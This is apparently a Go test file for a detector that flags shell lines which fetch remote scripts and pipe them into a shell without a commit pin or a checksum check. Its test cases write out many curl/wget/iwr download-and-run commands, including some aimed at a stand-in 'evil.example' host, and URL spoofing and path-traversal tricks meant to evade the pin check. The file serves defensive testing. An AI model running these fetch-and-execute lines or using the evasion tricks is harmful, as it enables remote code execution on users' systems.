package shellcmd

import (
	"slices"
	"strings"
	"testing"
)

const (
	sha40        = "0123456789abcdef0123456789abcdef01234567"
	commitPrefix = "https://raw.githubusercontent.com/vgmartinez/tools/" + sha40
	commitURL    = commitPrefix + "/install.sh"
	branchURL    = "https://raw.githubusercontent.com/vgmartinez/tools/main/install.sh"
	sum          = "abababababababababababababababababababababababababababababababab"
)

func TestUnpinned(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		// Immutable URLs.
		{"curl -fsSL " + commitURL + " | sh", nil},
		{"curl -fsSL '" + commitURL + "?token=x' | bash", nil},
		{"wget -qO- https://cdn.jsdelivr.net/gh/vgmartinez/tools@0123456789abcdef0123456789abcdef01234567/i.sh | sh", nil},
		{"curl -fsSL https://registry.example.invalid/v2/tools/blobs/sha256:" + strings.Repeat("ab", 32) + " | sh", []string{Fetch, Pipe}},
		{"wget -qO- https://registry.example.invalid/v2/tools/manifests/sha256:" + strings.Repeat("ab", 32) + " | sh", []string{Fetch, Pipe}},
		{"curl -fsSL https://evil.example/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL https://raw.githubusercontent.com@evil.example/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL https://github.com/vgmartinez/tools/releases/download/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL https://RAW.GITHUBUSERCONTENT.COM/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", nil},
		{"curl -fsSL https://raw.githubusercontent.com./vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL " + commitPrefix + "/../main/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL " + commitPrefix + "/../../../vgmartinez/repo/main/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL https://github.com/vgmartinez/tools/raw/" + sha40 + "/../../../../x/y/raw/main/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL " + commitPrefix + "/./../main/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL " + commitPrefix + "/%2e%2e/main/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL " + commitPrefix + "/%2E%2e/main/i.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL " + commitPrefix + "/.%2E/main/i.sh | sh", []string{Fetch, Pipe}},
		{"wget -qO- " + commitPrefix + "/../main/i.sh | sh", []string{Fetch, Pipe}},
		{"wget -qO- " + commitPrefix + "/%2e%2e/main/i.sh | sh", []string{Fetch, Pipe}},
		{"iwr " + commitURL + " | iex", nil},
		{"deno run -A " + strings.Replace(commitURL, "install.sh", "mod.ts", 1), nil},
		{"iex (New-Object Net.WebClient).DownloadString('" + commitURL + "')", nil},
		{"curl -fsSL " + branchURL + " | sh", []string{Fetch, Pipe}},
		{"curl -fsSL http://raw.githubusercontent.com/vgmartinez/tools/0123456789abcdef0123456789abcdef01234567/install.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL https://github.com/vgmartinez/tools/releases/download/v1.2.3/install.sh | sh", []string{Fetch, Pipe}},
		{"curl -fsSL " + commitURL + " | sh; curl -fsSL " + branchURL + " | sh", []string{Fetch, Pipe}},
		{"curl -fsSL $URL | sh", []string{Pipe}},
		{"iwr $u | iex", []string{Pipe}},
		{"curl " + commitURL + " $MIRROR | sh", []string{Fetch, Pipe}},
		{"iex (New-Object Net.WebClient).DownloadString('" + branchURL + "')", []string{Fetch, Pipe}},
		{"npx -y create-acme@1.2.3", []string{Fetch}},
		{"echo hi | sh", []string{Pipe}},
		{"powershell -EncodedCommand ZQBjAGgAbwA=", []string{Encoded}},

		// Checksum verified before running.
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha256sum -c - && sh i.sh", nil},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha256sum -c && sh i.sh", nil},
		{"curl -fsSLo i.sh " + branchURL + " && printf '%s  i.sh\\n' " + sum + " | sha256sum --check - && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && printf '" + sum + "  i.sh\\n' | sha256sum --check - && sh i.sh", nil},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | shasum -a 256 -c && sh i.sh", nil},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; echo \"" + sum + "  i.sh\" | sha256sum -c -; sh i.sh", nil},
		{"set -e\ncurl -fsSLo i.sh " + branchURL + "\necho \"" + sum + "  i.sh\" | sha256sum -c\nsh i.sh", nil},
		{"curl -fsSLo i.sh " + branchURL + "; echo \"" + sum + "  i.sh\" | sha256sum -c -; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; echo \"" + sum + "  i.sh\" | sha256sum -c - && true; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; echo \"" + sum + "  i.sh\" | sha256sum -c - & sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; echo \"" + sum + "  i.sh\" | sha256sum -c - | cat; sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha256sum -c - | cat && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha256sum -c - || true; sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha256sum -c --ignore-missing && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha256sum -c /dev/stdin && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha1sum -c - && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && cat sums | sha256sum -c - && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && ! echo \"" + sum + "  i.sh\" | sha256sum -c - && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum -c - && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum -c && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && echo \"" + sum + "  i.sh\" | sha256sum -c - && echo ok | sh", []string{Fetch, Pipe}},
		{"curl -fsSLo i.sh " + branchURL + " && sha512sum --check i.sh.sha512 && bash i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum --check i.sh.sha256 && bash i.sh", nil},
		{"curl -fsSLo i.sh " + branchURL + " && shasum -a 256 -c sums.txt && sh i.sh", nil},
		{"set -euo pipefail\ncurl -fsSLo i.sh " + branchURL + "\nsha256sum -c sums.txt\nsh i.sh", nil},
		{"curl -fsSLo t.tgz " + branchURL + " && sha256sum -c sums.txt", []string{Fetch}},
		{"bash -c 'curl -fsSLo i.sh " + branchURL + " && sha256sum -c sums && sh i.sh'", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + "\nsha256sum -c sums.txt\nsh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum -c sums.txt || true; sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sh i.sh && sha256sum -c sums.txt", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum sums.txt && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && shasum -c sums.txt && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha1sum -c sums.txt && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && ! sha256sum -c s && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum -c s | tee log && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum -c s && sh i.sh || sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum --ignore-missing -c s && sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + " && sha256sum -c /dev/null && sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; set +e; sh i.sh", []string{Fetch}},
		{"set -e || true; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"(set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh)", []string{Fetch}},
		{"f() { set -e; }; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"if true; then set -e; fi; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum --quiet -c s; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s && true; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s & sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + " & sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + " && true; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e; true && curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e & curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"true && set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + "; set -e; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; set -e; sh i.sh", []string{Fetch}},
		{"set -e; eval \"set +e\"; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; eval \"set +e\"; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; source env.sh; sh i.sh", []string{Fetch}},
		{"set -e; . ./env.sh; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; builtin eval x; sha256sum -c s; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; if sha256sum -c s; then :; fi; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; while sha256sum -c s; do break; done; sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; (sha256sum -c s); sh i.sh", []string{Fetch}},
		{"set -e; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s", []string{Fetch}},
		{"set -e\ncurl -fsSLo i.sh " + branchURL + "\nsha256sum -c s\nsh i.sh\n", nil},
		{"set -o errexit; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", nil},
		{"curl -fsSL " + branchURL + " | tee i.sh | sh && sha256sum -c sums", []string{Fetch, Pipe}},
		{"npx -y create-acme && sha256sum -c sums.txt", []string{Fetch}},
		{"git clone https://github.com/vgmartinez/tools && make -C tools", []string{Fetch}},

		// No risk.
		{"npm ci && npm run build", nil},
		{"", nil},
	}
	for _, tc := range cases {
		got := UnpinnedSums(tc.line, pinnedSums).Risks
		if !slices.Equal(got, append([]string{}, tc.want...)) {
			t.Errorf("UnpinnedSums(%q) = %q, want %q", tc.line, got, tc.want)
		}
	}
	line := "curl -fsSLo i.sh " + branchURL + " && sha256sum -c s && sh i.sh"
	if got := Unpinned(line).Risks; !slices.Equal(got, []string{Fetch}) {
		t.Errorf("Unpinned without sums files = %q, want fetch", got)
	}
}

// pinnedSums is the committed sums files the Unpinned tests assume.
var pinnedSums = Sums{"i.sh.sha256": {"i.sh"}, "sums.txt": {"i.sh"}, "s": {"i.sh"}, "sums": {"i.sh"}}

func TestUnpinnedArgv(t *testing.T) {
	cases := []struct {
		argv []string
		want []string
	}{
		{[]string{"curl", "-fsSL", commitURL, "-o", "/tmp/i.sh"}, nil},
		{[]string{"curl", "-fsSL", branchURL, "-o", "/tmp/i.sh"}, []string{Fetch}},
		{[]string{"bash", "-c", "curl -fsSL " + commitURL + " | sh"}, nil},
		{[]string{"bash", "-c", "curl -fsSL " + branchURL + " | sh"}, []string{Fetch, Pipe}},
		{[]string{"bash", "-c", "curl -fsSLo i.sh " + branchURL + " && sha256sum -c s && sh i.sh"}, nil},
		{[]string{"bash", "-c", "curl -fsSLo i.sh " + branchURL + " && sha256sum -c s && sh i.sh", "x"}, []string{Fetch}},
		{[]string{"bash", "-c", "trap 'sh i.sh' EXIT; curl -fsSLo i.sh " + branchURL + " && sha256sum -c s && sh i.sh"}, []string{Fetch}},
		{nil, nil},
	}
	for _, tc := range cases {
		got := UnpinnedArgvSums(tc.argv, pinnedSums).Risks
		if !slices.Equal(got, append([]string{}, tc.want...)) {
			t.Errorf("UnpinnedArgvSums(%q) = %q, want %q", tc.argv, got, tc.want)
		}
	}
}

func TestUnpinnedSumsTargets(t *testing.T) {
	const line = "curl -fsSLo i.sh https://raw.githubusercontent.com/vgmartinez/tools/main/install.sh && sha256sum -c s && sh i.sh"
	if got := UnpinnedSumsTargets(line, Sums{"s": {"i.sh"}}, map[string]bool{"i.sh": true}).Risks; !slices.Equal(got, []string{Fetch}) {
		t.Fatalf("UnpinnedSumsTargets with a symlink = %q, want fetch", got)
	}
	if got := UnpinnedSumsTargets(line, Sums{"s": {"i.sh"}}, map[string]bool{"s": true}).Risks; len(got) != 0 {
		t.Fatalf("UnpinnedSumsTargets with an unrelated symlink = %q, want no risks", got)
	}
}

func TestImmutableURL(t *testing.T) {
	for url, want := range map[string]bool{
		commitURL: true,
		"https://github.com/vgmartinez/tools/raw/" + strings.Repeat("a", 64) + "/i.sh":                          true,
		"https://RAW.GITHUBUSERCONTENT.COM/vgmartinez/tools/" + strings.Repeat("a", 40) + "/i.sh":               true,
		"https://gitlab.com/vgmartinez/tools/-/raw/" + strings.Repeat("ab", 20) + "/i.sh":                       true,
		"https://cdn.jsdelivr.net/gh/vgmartinez/tools@" + strings.Repeat("ab", 20) + "/i.sh":                    true,
		"https://codeload.github.com/vgmartinez/tools/tar.gz/" + strings.Repeat("ab", 20):                       true,
		"https://gist.githubusercontent.com/vgmartinez/abcdef/" + "raw/" + strings.Repeat("ab", 20) + "/i.sh":   true,
		"https://registry.example.invalid/v2/tools/blobs/sha256:" + strings.Repeat("0", 64):                     false,
		"https://gitlab.example.invalid/vgmartinez/tools/-/raw/0123456789ABCDEF0123456789abcdef01234567/i.sh":   false,
		"https://evil.example/" + strings.Repeat("ab", 20) + "/i.sh":                                            false,
		"https://raw.githubusercontent.com@evil.example/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh": false,
		"https://user:pw@raw.githubusercontent.com/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh":      false,
		"https://raw.githubusercontent.com./vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh":             false,
		"https://github.com/vgmartinez/tools/releases/download/" + strings.Repeat("ab", 20) + "/i.sh":           false,
		"https://evil.example/sha256:" + strings.Repeat("0", 64) + "/i.sh":                                      false,
		"http://raw.githubusercontent.com/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh":               false,
		commitPrefix + "/../main/i.sh":                                                        false,
		commitPrefix + "/../../../vgmartinez/repo/main/i.sh":                                  false,
		"https://github.com/vgmartinez/tools/raw/" + sha40 + "/../../../../x/y/raw/main/i.sh": false,
		commitPrefix + "/./../main/i.sh":                                                      false,
		commitPrefix + "/%2e%2e/main/i.sh":                                                    false,
		commitPrefix + "/%2E%2E/main/i.sh":                                                    false,
		commitPrefix + "/.%2E/main/i.sh":                                                      false,
		commitPrefix + "/%2e/i.sh":                                                            false,
		commitPrefix + "/%zz/i.sh":                                                            false,
		branchURL:                                                                             false,
		"https://example.invalid/i.sh?ref=0123456789abcdef0123456789abcdef01234567":           false,
		"https://example.invalid/0123456789abcdef0123456789abcdef0123456/i.sh":                false,
		"https://example.invalid/sha256:" + strings.Repeat("0", 63):                           false,
		"ftp://example.invalid/0123456789abcdef0123456789abcdef01234567/i.sh":                 false,
		"https:///0123456789abcdef0123456789abcdef01234567":                                   false,
		"%zz": false,
	} {
		if got := immutableURL(url); got != want {
			t.Errorf("immutableURL(%q) = %v, want %v", url, got, want)
		}
	}
}

// FuzzUnpinned checks that Unpinned reports exactly the risks Risks
// does, or none, and reads the line no more than Analyze does.
func FuzzUnpinned(f *testing.F) {
	for _, seed := range []string{
		"curl -fsSL " + commitURL + " | sh",
		"curl -fsSLo i.sh " + branchURL + " && sha256sum -c s && sh i.sh",
		"set -e\ncurl -o x " + branchURL + "\nshasum -a 512 -c s",
		"iwr $u | iex; (New-Object Net.WebClient).DownloadString('" + commitURL + "')",
		"$(`'\"\\",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, line string) {
		got, all := Unpinned(line), Analyze(line)
		if len(got.Risks) > 0 && !slices.Equal(got.Risks, all.Risks) {
			t.Fatalf("Unpinned(%q) = %q, Risks = %q", line, got.Risks, all.Risks)
		}
		if got.Work != all.Work {
			t.Fatalf("Unpinned(%q).Work = %d, Analyze = %d", line, got.Work, all.Work)
		}
	})
}
